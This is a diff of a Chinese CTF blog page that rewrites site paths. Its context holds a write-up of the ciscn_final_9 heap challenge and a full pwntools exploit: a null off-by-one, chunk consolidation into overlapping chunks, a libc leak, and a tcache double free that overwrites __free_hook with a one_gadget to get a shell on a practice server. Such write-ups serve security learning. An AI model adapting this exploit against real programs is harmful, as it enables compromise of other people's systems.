@@ -5,33 +5,33 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
 <meta name="generator" content="Hexo 7.3.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-<link rel="stylesheet" href="/ha1vk/css/main.css">
+<link rel="stylesheet" href="/css/main.css">
 
 
-<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
   </script>
 
   <meta name="description" content="首先，检查一下程序的保护机制   然后，我们用IDA分析一下,safe_read函数存在一个null off by one漏洞   Delete函数里在free之前会清空堆的内容，">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ciscn_final_9(null off by one当无法shrink unsorted bin或者控制prev_size时的利用手法)">
-<meta property="og:url" content="https://github.com/ha1vk/2020/06/11/ciscn_final_9/index.html">
+<meta property="og:url" content="https://github.com/2020/06/11/ciscn_final_9/index.html">
 <meta property="og:site_name" content="ha1vk&#39;s blog">
 <meta property="og:description" content="首先，检查一下程序的保护机制   然后，我们用IDA分析一下,safe_read函数存在一个null off by one漏洞   Delete函数里在free之前会清空堆的内容，">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://github.com/ha1vk/2020/06/11/ciscn_final_9/image1.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/06/11/ciscn_final_9/image2.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/06/11/ciscn_final_9/image3.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/06/11/ciscn_final_9/image4.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/06/11/ciscn_final_9/1.png">
+<meta property="og:image" content="https://github.com/2020/06/11/ciscn_final_9/image1.png">
+<meta property="og:image" content="https://github.com/2020/06/11/ciscn_final_9/image2.png">
+<meta property="og:image" content="https://github.com/2020/06/11/ciscn_final_9/image3.png">
+<meta property="og:image" content="https://github.com/2020/06/11/ciscn_final_9/image4.png">
+<meta property="og:image" content="https://github.com/2020/06/11/ciscn_final_9/1.png">
 <meta property="article:published_time" content="2020-06-11T05:50:50.000Z">
 <meta property="article:modified_time" content="2025-06-25T12:59:16.909Z">
 <meta property="article:author" content="ha1vk">
@@ -40,9 +40,9 @@
 <meta property="article:tag" content="off by one">
 <meta property="article:tag" content="堆风水">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://github.com/ha1vk/2020/06/11/ciscn_final_9/image1.png">
+<meta name="twitter:image" content="https://github.com/2020/06/11/ciscn_final_9/image1.png">
 
-<link rel="canonical" href="https://github.com/ha1vk/2020/06/11/ciscn_final_9/">
+<link rel="canonical" href="https://github.com/2020/06/11/ciscn_final_9/">
 
 
 <script id="page-configurations">
@@ -104,7 +104,7 @@
 
   <div class="site-meta">
 
-    <a href="/ha1vk/" class="brand" rel="start">
+    <a href="/" class="brand" rel="start">
       <span class="logo-line-before"><i></i></span>
       <h1 class="site-title">ha1vk's blog</h1>
       <span class="logo-line-after"><i></i></span>
@@ -125,27 +125,27 @@
   <ul id="menu" class="main-menu menu">
         <li class="menu-item menu-item-home">
 
-    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
 
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
 
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
 
   </li>
         <li class="menu-item menu-item-about">
 
-    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -203,10 +203,10 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/06/11/ciscn_final_9/">
+    <link itemprop="mainEntityOfPage" href="https://github.com/2020/06/11/ciscn_final_9/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="ha1vk">
       <meta itemprop="description" content="">
     </span>
@@ -241,7 +241,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                 </span>
             </span>
 
@@ -264,18 +264,18 @@
 
       
         <p>首先，检查一下程序的保护机制</p>
-<img src="/ha1vk/2020/06/11/ciscn_final_9/image1.png" class="">
+<img src="/2020/06/11/ciscn_final_9/image1.png" class="">
 
 <p>然后，我们用IDA分析一下,safe_read函数存在一个null off by one漏洞</p>
-<img src="/ha1vk/2020/06/11/ciscn_final_9/image2.png" class="">
+<img src="/2020/06/11/ciscn_final_9/image2.png" class="">
 
-<p>Delete函数里在free之前会清空堆的内容， <img src="/ha1vk/2020/06/11/ciscn_final_9/image3.png" class=""></p>
+<p>Delete函数里在free之前会清空堆的内容， <img src="/2020/06/11/ciscn_final_9/image3.png" class=""></p>
 <p>申请的堆大小是固定的，属于unsorted bin范围</p>
-<img src="/ha1vk/2020/06/11/ciscn_final_9/image4.png" class="">
+<img src="/2020/06/11/ciscn_final_9/image4.png" class="">
 
 <p>从上面看,prev_size无法受我们控制，因为堆的大小为0x100，因此prev_size是0x100的整数倍，\x00会截断输入，即使我们先布置\x01，然后delete后再布置\x00也不行，因为delete函数会清空原来的内容。综上看，prev_size不能受我们控制，如果使用shrink unsorted bin size的话，也不行，因为如果shrink unsorted bin的话，要想再次从这个unsorted bin里成功切割内存，其shrink掉的那部分得伪造成一个chunk，但是delete功能会清空我们伪造的数据。并且由于大小都是0x100的整数倍，shrink不了，因此这两种方法都不可行了。</p>
 <p>那么，我们可以利用堆块的合并。</p>
-<img src="/ha1vk/2020/06/11/ciscn_final_9/1.png" class="">
+<img src="/2020/06/11/ciscn_final_9/1.png" class="">
 
 <p>假设我们连续合并这3个chunk,合并是有顺序的，先合并0、1，这将使得2的prev_size变成0x200，然后合并2，2的prev_size 0x200仍然存在。接下来，我们从中把0切割申请回来，2的prev_size仍然为0x200,然后我们利用null off by one修改1的size低1字节，利用堆块合并构造overlap chunk即可。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(&#x27;./ciscn_final_9&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27466</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;</span>)</span><br><span class="line">malloc_hook_s = libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">free_hook_s = libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;which command?&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;size&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;content&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;which command?&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;index&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;which command?&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;index&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xF0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xF0</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0xF0</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0xF0</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0xF0</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0xF0</span>) <span class="comment">#2</span></span><br><span class="line"><span class="comment">#3~9</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">   add(<span class="number">0xF0</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0xF0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">   delete(i)</span><br><span class="line"><span class="comment">#0放入unsorted bin</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#1放入unsorted bin,此时0、1会合并，在2的prev_size处留下0x200</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#2放入unsorted bin，与前面合并，但是prev_size不会清空</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#0~6</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">   add(<span class="number">0xF0</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0xF0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#由于prev_size不能任我们控制，因此，我们使用了这种方式控制9的prev_size为0x200</span></span><br><span class="line">add(<span class="number">0xF0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xF0</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0xF0</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0xF0</span>) <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0xF0</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0xF0</span>) <span class="comment">#9</span></span><br><span class="line"><span class="comment">#到目前，9的prev_size为0x200，接下来，我们利用null off by one构造overlap chunk</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#填充tcache bin</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">   delete(i)</span><br><span class="line"><span class="comment">#7放入unsorted bin</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"><span class="comment">#0~6</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">   add(<span class="number">0xF0</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0xF0</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0xF8</span>,<span class="string">&#x27;null off by one&#x27;</span>) <span class="comment">#7</span></span><br><span class="line"><span class="comment">#填充tcache bin</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">   delete(i)</span><br><span class="line"><span class="comment">#9放入unsorted bin，发生合并，形成overlap chunk</span></span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"><span class="comment">#0~6</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">   add(<span class="number">0xF0</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0xF0</span>)</span><br><span class="line"><span class="comment">#将glibc指针移动到7</span></span><br><span class="line">add(<span class="number">0xF0</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment">#8</span></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">main_arena_xx = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">malloc_hook_addr = (main_arena_xx &amp; <span class="number">0xFFFFFFFFFFFFF000</span>) + (malloc_hook_s &amp; <span class="number">0xFFF</span>)</span><br><span class="line">libc_base = malloc_hook_addr - malloc_hook_s</span><br><span class="line">free_hook_addr = libc_base + free_hook_s</span><br><span class="line">one_gadget_addr = libc_base + <span class="number">0x4f322</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base=&#x27;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;free_hook_addr=&#x27;</span>,<span class="built_in">hex</span>(free_hook_addr)</span><br><span class="line">add(<span class="number">0xF0</span>,<span class="string">&#x27;b&#x27;</span>) <span class="comment">#9与7重合</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#double free</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xF0</span>,p64(free_hook_addr)) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0xF0</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0xF0</span>,p64(one_gadget_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
@@ -287,10 +287,10 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/ha1vk/tags/tcache/" rel="tag"># tcache</a>
-              <a href="/ha1vk/tags/unsorted-bin/" rel="tag"># unsorted bin</a>
-              <a href="/ha1vk/tags/off-by-one/" rel="tag"># off by one</a>
-              <a href="/ha1vk/tags/%E5%A0%86%E9%A3%8E%E6%B0%B4/" rel="tag"># 堆风水</a>
+              <a href="/tags/tcache/" rel="tag"># tcache</a>
+              <a href="/tags/unsorted-bin/" rel="tag"># unsorted bin</a>
+              <a href="/tags/off-by-one/" rel="tag"># off by one</a>
+              <a href="/tags/%E5%A0%86%E9%A3%8E%E6%B0%B4/" rel="tag"># 堆风水</a>
           </div>
 
         
@@ -299,11 +299,11 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/ha1vk/2020/06/11/ciscn_final_6/" rel="prev" title="ciscn_final_6">
+    <a href="/2020/06/11/ciscn_final_6/" rel="prev" title="ciscn_final_6">
       <i class="fa fa-chevron-left"></i> ciscn_final_6
     </a></div>
       <div class="post-nav-item">
-    <a href="/ha1vk/2020/06/11/hfctf_2020_sucurebox/" rel="next" title="hfctf_2020_sucurebox(0地址引用)">
+    <a href="/2020/06/11/hfctf_2020_sucurebox/" rel="next" title="hfctf_2020_sucurebox(0地址引用)">
       hfctf_2020_sucurebox(0地址引用) <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
@@ -375,20 +375,20 @@
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
-          <a href="/ha1vk/archives/">
+          <a href="/archives/">
         
           <span class="site-state-item-count">233</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
-            <a href="/ha1vk/categories/">
+            <a href="/categories/">
           
         <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
-            <a href="/ha1vk/tags/">
+            <a href="/tags/">
           
         <span class="site-state-item-count">145</span>
         <span class="site-state-item-name">标签</span></a>
@@ -461,30 +461,30 @@
   </div>
 
   
-  <script src="/ha1vk/lib/anime.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
 
-<script src="/ha1vk/js/utils.js"></script>
+<script src="/js/utils.js"></script>
 
-<script src="/ha1vk/js/motion.js"></script>
-
-
-<script src="/ha1vk/js/schemes/muse.js"></script>
+<script src="/js/motion.js"></script>
 
 
-<script src="/ha1vk/js/next-boot.js"></script>
+<script src="/js/schemes/muse.js"></script>
 
 
-
-
-  
+<script src="/js/next-boot.js"></script>
 
 
 
 
   
-<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
 
 
 
